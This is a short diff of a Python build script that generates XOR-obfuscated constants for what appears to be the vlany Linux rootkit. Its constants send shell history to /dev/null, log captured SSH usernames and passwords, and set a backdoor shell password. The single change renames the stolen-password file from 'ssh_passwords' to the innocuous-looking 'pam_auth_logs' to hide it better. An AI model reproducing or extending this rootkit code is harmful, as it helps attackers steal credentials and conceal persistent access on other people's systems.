@@ -204,7 +204,7 @@ def const_h_setup():
     const_h += '#define VLANY_PERM "' + xor("root") + '"\n'
     const_h += '#define HISTFILE "' + xor("/dev/null") + '"\n'
     const_h += '#define BASH_RC "' + xor(INSTALL + "/.bashrc") + '"\n'
-    const_h += '#define SSH_PASSWORDS "' + xor(INSTALL + "/ssh_passwords") + '"\n'
+    const_h += '#define SSH_PASSWORDS "' + xor(INSTALL + "/pam_auth_logs") + '"\n'
     const_h += '#define LOG_FORMAT "' + xor("Username: %s\nPassword: %s\n\n") + '"\n'
 
     const_h += '#define SHELL_PASSWORD "' + xor(SHELL_PASSWORD) + '"\n'
